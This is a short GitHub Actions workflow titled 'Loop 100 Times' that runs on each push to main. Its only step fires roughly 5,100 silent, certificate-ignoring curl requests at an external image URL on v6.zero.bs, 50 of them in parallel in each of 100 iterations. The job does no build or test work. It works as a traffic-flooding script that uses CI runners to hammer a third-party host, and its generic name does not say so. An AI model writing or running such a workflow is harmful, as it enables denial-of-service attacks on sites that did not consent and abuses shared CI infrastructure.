name: Loop 100 Times bfb7c429-4ca6-4459-8dea-2159d94d40fa

on:
  push:
    branches:
      - main

jobs:
  loop_job:
    runs-on: ubuntu-latest
    steps:
      - name: Run loop 100 times bfb7c429-4ca6-4459-8dea-2159d94d40fa
        id: loop_step
        run: |
          counter=0
          max_loops=50
          target="https://v6.zero.bs/bimages/zerobs/screens_luup.png"
          while [ $counter -lt 100 ]; do
            echo "Running loop iteration $((counter + 1))..."
            curl_loop=0
            while [ $curl_loop -lt $max_loops ]; do
              curl -ks "$target" 2>&1 > /dev/null &
              curl_loop=$((curl_loop + 1))
            done
            echo " [+] started $max_loops processes "
            curl -ks "$target" 2>&1 > /dev/null
            
            counter=$((counter + 1))
          done
          echo ">> DONE!"




